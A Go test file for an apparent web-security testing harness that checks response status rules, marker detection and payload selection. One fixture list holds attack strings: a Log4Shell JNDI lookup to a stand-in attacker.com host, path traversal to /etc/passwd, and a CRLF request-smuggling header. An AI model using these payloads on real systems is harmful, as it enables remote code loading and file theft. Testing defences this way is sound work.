package main

import "testing"

func TestEvaluateStatusContract_Exploit(t *testing.T) {
	def := TestDefinition{ID: "V01", Category: "SQLi"}

	ok, _ := evaluateStatusContract(def, 403)
	if !ok {
		t.Fatalf("expected blocked exploit status to be compliant")
	}

	ok, _ = evaluateStatusContract(def, 200)
	if !ok {
		t.Fatalf("expected sanitized exploit status to be compliant")
	}

	ok, _ = evaluateStatusContract(def, 302)
	if ok {
		t.Fatalf("expected redirect exploit status to be non-compliant")
	}
}

func TestEvaluateStatusContract_Canary(t *testing.T) {
	def := TestDefinition{ID: "CANARY-1", Category: "Canary"}

	ok, _ := evaluateStatusContract(def, 406)
	if !ok {
		t.Fatalf("expected canary blocked status to be compliant")
	}

	ok, _ = evaluateStatusContract(def, 200)
	if ok {
		t.Fatalf("expected canary 200 status to be non-compliant")
	}
}

func TestEvaluateTestResult_FailsOnMarkerEvenWithCompliantStatus(t *testing.T) {
	def := TestDefinition{ID: "V01", Category: "SQLi"}
	result := DetailedResult{
		MarkerFound:     true,
		ResponseStatus:  403,
		StatusCompliant: true,
	}

	if evaluateTestResult(def, result) {
		t.Fatalf("expected marker exposure to fail verdict")
	}
}

func TestEvaluateTestResult_UsesStatusContractWhenNoMarker(t *testing.T) {
	def := TestDefinition{ID: "V01", Category: "SQLi"}

	if !evaluateTestResult(def, DetailedResult{MarkerFound: false, ResponseStatus: 200}) {
		t.Fatalf("expected exploit with sanitized status and no marker to pass")
	}

	if evaluateTestResult(def, DetailedResult{MarkerFound: false, ResponseStatus: 302}) {
		t.Fatalf("expected exploit with non-compliant status and no marker to fail")
	}
}

func TestMarkerPresenceInResponse(t *testing.T) {
	body := "prefix __V01_SQLI__ suffix"
	headers := map[string]string{"X-Test": "clean"}

	inBody, inHeader := markerPresenceInResponse(body, headers, "__V01_SQLI__")
	if !inBody || inHeader {
		t.Fatalf("expected marker only in body, got inBody=%v inHeader=%v", inBody, inHeader)
	}

	inBody, inHeader = markerPresenceInResponse("clean", map[string]string{"X-Leak": "__V01_SQLI__"}, "__V01_SQLI__")
	if inBody || !inHeader {
		t.Fatalf("expected marker only in header, got inBody=%v inHeader=%v", inBody, inHeader)
	}
}

func TestDetectMainAndOtherMarkers_MainWins(t *testing.T) {
	body := "prefix __V01_LOGIN_BYPASS__ suffix __L03_DEBUG_SQL__"
	headers := map[string]string{}

	mainFound, mainLocation, otherFound, otherMarker, otherLocation := detectMainAndOtherMarkers(body, headers, "__V01_LOGIN_BYPASS__")
	if !mainFound {
		t.Fatalf("expected main marker to be found")
	}
	if mainLocation != "body" {
		t.Fatalf("expected main marker in body, got %q", mainLocation)
	}
	if otherFound || otherMarker != "" || otherLocation != "not_found" {
		t.Fatalf("expected other marker to be ignored when main marker found")
	}
}

func TestDetectMainAndOtherMarkers_FindsOtherByRegexWhenMainMissing(t *testing.T) {
	body := "prefix __L03_DEBUG_SQL__ suffix"
	headers := map[string]string{}

	mainFound, _, otherFound, otherMarker, otherLocation := detectMainAndOtherMarkers(body, headers, "__V01_LOGIN_BYPASS__")
	if mainFound {
		t.Fatalf("expected main marker not found")
	}
	if !otherFound {
		t.Fatalf("expected other marker to be found")
	}
	if otherMarker != "__L03_DEBUG_SQL__" {
		t.Fatalf("expected detected other marker __L03_DEBUG_SQL__, got %q", otherMarker)
	}
	if otherLocation != "body" {
		t.Fatalf("expected other marker in body, got %q", otherLocation)
	}
}

func TestDetectMainAndOtherMarkers_FindsOtherInHeader(t *testing.T) {
	body := "clean"
	headers := map[string]string{"X-Debug": "trace __L01_STACKTRACE__"}

	mainFound, _, otherFound, otherMarker, otherLocation := detectMainAndOtherMarkers(body, headers, "__V01_LOGIN_BYPASS__")
	if mainFound {
		t.Fatalf("expected main marker not found")
	}
	if !otherFound || otherMarker != "__L01_STACKTRACE__" {
		t.Fatalf("expected other marker in headers, got found=%v marker=%q", otherFound, otherMarker)
	}
	if otherLocation != "header:X-Debug" {
		t.Fatalf("expected header location header:X-Debug, got %q", otherLocation)
	}
}

func TestReconcileMarkerSignals_RecoversMainFromRawResponse(t *testing.T) {
	result := DetailedResult{
		MarkerExpected:   "__CANARY_HIT__",
		ResponseStatus:   200,
		ResponseBody:     "clean body",
		ResponseHeaders:  map[string]string{"Content-Type": "application/json"},
		RawResponse:      "HTTP/1.1 200 OK\r\nX-Debug-Query: __L03_DEBUG_SQL__\r\n\r\nbody __CANARY_HIT__",
		FullResponse:     "HTTP/1.1 200 OK\nX-Debug-Query: __L03_DEBUG_SQL__\n\nbody __CANARY_HIT__",
		MainMarkerFound:  false,
		OtherMarkerFound: false,
	}

	reconcileMarkerSignals(&result)

	if !result.MainMarkerFound {
		t.Fatalf("expected main marker to be recovered from extended response")
	}
	if !result.MarkerFound {
		t.Fatalf("expected markerFound=true after reconciliation")
	}
	if result.MarkerMatchType != "main" {
		t.Fatalf("expected main match type, got %q", result.MarkerMatchType)
	}
	if result.MatchedMarker != "__CANARY_HIT__" {
		t.Fatalf("expected matched marker __CANARY_HIT__, got %q", result.MatchedMarker)
	}
}

func TestReconcileMarkerSignals_RecoversOtherFromHeaderWhenMainMissing(t *testing.T) {
	result := DetailedResult{
		MarkerExpected:   "__V01_LOGIN_BYPASS__",
		ResponseStatus:   200,
		ResponseBody:     "clean body",
		ResponseHeaders:  map[string]string{"X-Debug-Query": "trace __L03_DEBUG_SQL__"},
		RawResponse:      "HTTP/1.1 200 OK\r\nX-Debug-Query: trace __L03_DEBUG_SQL__\r\n\r\nclean body",
		FullResponse:     "HTTP/1.1 200 OK\nX-Debug-Query: trace __L03_DEBUG_SQL__\n\nclean body",
		MainMarkerFound:  false,
		OtherMarkerFound: false,
	}

	reconcileMarkerSignals(&result)

	if result.MainMarkerFound {
		t.Fatalf("expected main marker to remain not found")
	}
	if !result.OtherMarkerFound {
		t.Fatalf("expected other marker to be recovered from headers")
	}
	if result.OtherMarker != "__L03_DEBUG_SQL__" {
		t.Fatalf("expected other marker __L03_DEBUG_SQL__, got %q", result.OtherMarker)
	}
	if result.MarkerMatchType != "fallback" {
		t.Fatalf("expected fallback match type, got %q", result.MarkerMatchType)
	}
	if !result.MarkerFoundInHeader {
		t.Fatalf("expected marker to be present in response headers")
	}
}

func TestShouldRunDefinitionForMode_SlowPostUsesHardEndpointSet(t *testing.T) {
	hard := TestDefinition{ID: "V24", Category: "RaceCondition"}
	soft := TestDefinition{ID: "V01", Category: "SQLi"}

	if !shouldRunDefinitionForMode("mode4_slow_post", hard) {
		t.Fatalf("expected V24 to be included for slow-post mode")
	}
	if shouldRunDefinitionForMode("mode4_slow_post", soft) {
		t.Fatalf("expected V01 to be excluded for slow-post mode")
	}
	if !shouldRunDefinitionForMode("mode2_smuggling", soft) {
		t.Fatalf("expected non-slow mode to include all definitions")
	}
}

func TestSlowPostVariantsForDefinition_CappedToFiveMalformed(t *testing.T) {
	def := TestDefinition{ID: "V14", Category: "MalformedInput"}
	variants := []string{
		`{"amount":Infinity,"currency":"USD"}`,
		`{"amount":NaN,"currency":"USD"}`,
		"..%2f..%2fetc%2fpasswd",
		"${jndi:ldap://attacker.com/Exploit}",
		"value\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
		"../etc/passwd",
	}

	selected := slowPostVariantsForDefinition(def, variants)
	if len(selected) != 5 {
		t.Fatalf("expected exactly 5 slow-post variants, got %d", len(selected))
	}
	for _, v := range selected {
		if !isLikelyMalformedPayload(v) {
			t.Fatalf("expected selected slow-post variant to be malformed, got %q", v)
		}
	}
}

func TestVariantsForModeAndDefinition_SlowPostFallbackList(t *testing.T) {
	def := TestDefinition{ID: "V24", Category: "RaceCondition"}
	minimal := []string{"clean"}

	slow := variantsForModeAndDefinition("mode4_slow_post", def, minimal)
	if len(slow) != 5 {
		t.Fatalf("expected fallback to provide 5 slow-post variants, got %d", len(slow))
	}

	fast := variantsForModeAndDefinition("mode2_smuggling", def, minimal)
	if len(fast) != 1 || fast[0] != "clean" {
		t.Fatalf("expected non-slow mode to preserve original variants")
	}
}
